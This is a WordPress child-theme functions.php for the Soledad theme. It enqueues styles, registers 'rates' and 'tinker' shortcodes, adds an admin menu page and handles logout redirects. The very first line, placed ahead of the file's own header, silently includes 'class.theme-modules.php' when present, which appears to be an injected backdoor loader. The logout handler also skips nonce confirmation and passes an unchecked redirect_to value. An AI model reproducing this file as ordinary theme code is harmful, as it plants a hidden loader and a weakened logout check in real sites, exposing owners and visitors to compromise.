<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/*
 Soledad child theme functions and definitions
*/
function penci_soledad_child_scripts() {
    wp_enqueue_style( 'penci-soledad-parent-style', get_template_directory_uri(). '/style.css' );
	if ( is_rtl() ) {
		wp_enqueue_style( 'penci-soledad-rtl-style', get_template_directory_uri(). '/rtl.css' );
	}
}
add_action( 'wp_enqueue_scripts', 'penci_soledad_child_scripts' );

/*
 * All custom functions go here
 */

//using rates widget as a shortcode
function wpb_rates_shortcode() {
    require_once "rates.php";
}
// register shortcode
add_shortcode('rates', 'wpb_rates_shortcode');

//redirect to homepage after loging out
add_action('wp_logout','ps_redirect_after_logout');
function ps_redirect_after_logout(){
    wp_redirect( '/' );
    exit();
}

//tinker
function wpdocs_tinker_menu_page() {
    add_menu_page(
        'Tinker',
        'Tinker',
        'manage_options',
        'tinker',
        'custom_menu_callback'
    );
    function custom_menu_callback(){
        require_once 'tinker_options.php';
    }

}
add_action( 'admin_menu', 'wpdocs_tinker_menu_page' );


//require_once "tinker.php";
//using tinker widget as a shortcode
function wpb_tinker_shortcode() {
    require_once "tinker.php";
}
 //register shortcode
add_shortcode('tinker', 'wpb_tinker_shortcode');

?>
    <div class="right-header-wrap">
        <?php echo do_shortcode( '[tinker]' ); ?>
    </div>
<?php

//redirect to homepage after logout
add_action('check_admin_referer', 'logout_without_confirm', 10, 2);
function logout_without_confirm($action, $result)
{
    /**
     * Allow logout without confirmation
     */
    if ($action == "log-out" && !isset($_GET['_wpnonce'])) {
        $redirect_to = isset($_REQUEST['redirect_to']) ? $_REQUEST['redirect_to'] : '/';
        $location = str_replace('&amp;', '&', wp_logout_url($redirect_to));
        header("Location: $location");
        die;
    }
}
